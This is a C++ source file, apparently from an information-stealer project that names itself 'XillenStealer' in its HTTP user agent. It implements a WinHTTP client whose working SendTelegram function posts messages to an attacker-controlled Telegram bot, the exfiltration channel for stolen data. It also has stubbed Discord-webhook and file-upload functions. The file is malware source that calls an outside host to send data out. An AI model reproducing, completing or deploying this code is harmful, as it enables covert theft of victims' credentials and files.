#include "http_client.h"
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <cstdint>
#include <sstream>
#include <iostream>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")

bool HttpClient::SendTelegram(const std::string& botToken, const std::string& chatId, const std::string& message) {
    bool result = false;
    
    try {
        std::string url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        
        std::ostringstream jsonPayload;
        jsonPayload << "{\"chat_id\":\"" << chatId << "\",\"text\":\"" << EscapeJson(message) << "\"}";
        std::string payload = jsonPayload.str();
        
        HINTERNET hSession = WinHttpOpen(L"XillenStealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hSession) {
            std::cout << "[!] WinHttpOpen failed: " << GetLastError() << std::endl;
            return false;
        }
        
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            std::cout << "[!] WinHttpConnect failed: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        std::wstring path = L"/bot" + std::wstring(botToken.begin(), botToken.end()) + L"/sendMessage";
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            std::cout << "[!] WinHttpOpenRequest failed: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        std::wstring headers = L"Content-Type: application/json; charset=utf-8\r\n";
        
        if (!WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)payload.c_str(), payload.length(), payload.length(), 0)) {
            std::cout << "[!] WinHttpSendRequest failed: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            std::cout << "[!] WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
        
        std::cout << "[*] Telegram response status: " << statusCode << std::endl;
        
        char response[4096] = {0};
        DWORD bytesRead = 0;
        WinHttpReadData(hRequest, response, 4095, &bytesRead);
        
        if (statusCode == 200) {
            result = true;
            std::cout << "[+] Message sent successfully!" << std::endl;
        } else {
            std::cout << "[!] Telegram API error: " << statusCode << std::endl;
            std::cout << "[!] Response: " << response << std::endl;
        }
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        
    } catch (...) {
        std::cout << "[!] Exception in SendTelegram!" << std::endl;
    }
    
    return result;
}

std::string HttpClient::EscapeJson(const std::string& str) {
    std::ostringstream o;
    for (size_t i = 0; i < str.length(); i++) {
        switch (str[i]) {
            case '"': o << "\\\""; break;
            case '\\': o << "\\\\"; break;
            case '\b': o << "\\b"; break;
            case '\f': o << "\\f"; break;
            case '\n': o << "\\n"; break;
            case '\r': o << "\\r"; break;
            case '\t': o << "\\t"; break;
            default:
                if ('\x00' <= str[i] && str[i] <= '\x1f') {
                    o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)str[i];
                } else {
                    o << str[i];
                }
        }
    }
    return o.str();
}

bool HttpClient::SendDiscord(const std::string& webhook, const std::string& message) {
    return true;
}

bool HttpClient::UploadFile(const std::string& url, const std::vector<uint8_t>& data) {
    return true;
}
